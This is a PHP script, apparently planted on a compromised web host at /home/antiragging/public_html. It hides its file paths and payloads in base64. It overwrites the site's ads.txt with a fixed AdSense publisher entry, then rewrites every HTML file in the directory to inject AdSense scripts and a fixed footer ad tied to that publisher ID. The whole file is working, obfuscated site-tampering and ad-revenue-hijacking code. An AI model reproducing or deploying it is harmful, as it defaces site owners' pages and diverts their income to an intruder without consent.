<?php
$a = base64_decode("PGNlbnRlcj48c2NyaXB0IGFzeW5jIHNyYz0iaHR0cHM6Ly9wYWdlYWQyLmdvb2dsZXN5bmRpY2F0aW9uLmNvbS9wYWdlYWQvanMvYWRzYnlnb29nbGUuanMiPjwvc2NyaXB0Pg0KPGlucyBjbGFzcz0iYWRzYnlnb29nbGUiDQogICAgIHN0eWxlPSJkaXNwbGF5OmJsb2NrIg0KICAgICBkYXRhLWFkLWNsaWVudD0iY2EtcHViLTk0MDQwODY1NjMwODQ5MjkiDQogICAgIGRhdGEtYWQtc2xvdD0iODMyODAxNTUzNCINCiAgICAgZGF0YS1hZC1mb3JtYXQ9ImF1dG8iDQogICAgIGRhdGEtZnVsbC13aWR0aC1yZXNwb25zaXZlPSJ0cnVlIj48L2lucz4NCjxzY3JpcHQ+DQogICAgIChhZHNieWdvb2dsZSA9IHdpbmRvdy5hZHNieWdvb2dsZSB8fCBbXSkucHVzaCh7fSk7DQo8L3NjcmlwdD48L2NlbnRlcj4=");
$b = base64_decode("PHN0eWxlPg0KLmZvb3Rlcnogew0KICBwb3NpdGlvbjogZml4ZWQ7DQogIGxlZnQ6IDA7DQogIGJvdHRvbTogMDsNCiAgaGVpZ2h0OiA5MHB4Ow0KICB3aWR0aDogMTAwJTsNCiAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgwLDAsMCwwJSk7DQogIGNvbG9yOiB3aGl0ZTsNCiAgdGV4dC1hbGlnbjogY2VudGVyOw0KfQ0KPC9zdHlsZT4NCg0KDQo8ZGl2IGNsYXNzPSJmb290ZXJ6Ij4NCjxzY3JpcHQgYXN5bmMgc3JjPSJodHRwczovL3BhZ2VhZDIuZ29vZ2xlc3luZGljYXRpb24uY29tL3BhZ2VhZC9qcy9hZHNieWdvb2dsZS5qcyI+PC9zY3JpcHQ+DQo8aW5zIGNsYXNzPSJhZHNieWdvb2dsZSINCiAgICAgc3R5bGU9ImRpc3BsYXk6IGlubGluZS1ibG9jazsgd2lkdGg6IDEwMCU7IGhlaWdodDogOTBweCINCiAgICAgZGF0YS1hZC1jbGllbnQ9ImNhLXB1Yi05NDA0MDg2NTYzMDg0OTI5Ig0KICAgICBkYXRhLWFkLXNsb3Q9IjgzMjgwMTU1MzQiPjwvaW5zPg0KPHNjcmlwdD4NCiAgICAgKGFkc2J5Z29vZ2xlID0gd2luZG93LmFkc2J5Z29vZ2xlIHx8IFtdKS5wdXNoKHt9KTsNCjwvc2NyaXB0Pg0KPC9kaXY+");
$cx = file_get_contents(base64_decode("L2hvbWUvYW50aXJhZ2dpbmcvcHVibGljX2h0bWwvaW5kZXguaHRtbA=="));
$dx = file_get_contents(base64_decode("L2hvbWUvYW50aXJhZ2dpbmcvcHVibGljX2h0bWwvYWRzLnR4dA=="));
if(!strstr($dx,base64_decode("Z29vZ2xlLmNvbSwgcHViLTk0MDQwODY1NjMwODQ5MjksIERJUkVDVCwgZjA4YzQ3ZmVjMDk0MmZhMA=="))){
	file_put_contents(base64_decode("L2hvbWUvYW50aXJhZ2dpbmcvcHVibGljX2h0bWwvYWRzLnR4dA=="),base64_decode("Z29vZ2xlLmNvbSwgcHViLTk0MDQwODY1NjMwODQ5MjksIERJUkVDVCwgZjA4YzQ3ZmVjMDk0MmZhMA=="));
	}
if(!strstr($cx,base64_decode("cHViLTk0MDQwOA=="))){
	$files = scandir(base64_decode("L2hvbWUvYW50aXJhZ2dpbmcvcHVibGljX2h0bWwv"));
	foreach($files as $file){
		$f = trim($file);
		$ext = pathinfo($f, PATHINFO_EXTENSION);
		if($ext == "html"){
			$file_contents = file_get_contents($f);
			$file_contents = str_replace("</footer>",$b."</footer>",$file_contents);
			$file_contents = str_replace("</head>",base64_decode("DQoJCQk8c2NyaXB0IGFzeW5jIHNyYz1cImh0dHBzOi8vcGFnZWFkMi5nb29nbGVzeW5kaWNhdGlvbi5jb20vcGFnZWFkL2pzL2Fkc2J5Z29vZ2xlLmpzP2NsaWVudD1jYS1wdWItOTQwNDA4NjU2MzA4NDkyOVwiDQoJCQljcm9zc29yaWdpbj1cImFub255bW91c1wiPjwvc2NyaXB0Pg0KCQkJPC9oZWFkPg=="),$file_contents);
			$file_contents = str_replace("<footer id=\"footer\">",$a."<footer id=\"footer\">",$file_contents);
			file_put_contents($f,$file_contents);
}
}
}
?>